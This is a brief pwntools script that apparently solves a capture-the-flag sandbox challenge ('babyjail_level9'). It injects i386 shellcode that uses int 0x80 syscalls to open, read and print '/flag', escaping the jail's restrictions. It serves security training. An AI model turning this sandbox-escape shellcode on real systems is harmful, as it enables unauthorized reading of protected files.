from pwn import *
context(arch="i386",os="linux",log_level="debug")
p = process("/challenge/babyjail_level9")
# shellcode = shellcraft.open("/flag")
shellcode = """
    mov eax, 5
    mov ebx, 0x1337034
    xor ecx, ecx
    xor edx, edx
    int 0x80
"""
shellcode += shellcraft.read(3, 0x1337100, 0x40)
shellcode += shellcraft.write(1, 0x1337100, 0x40)
p.send(asm(shellcode) + b'/flag')
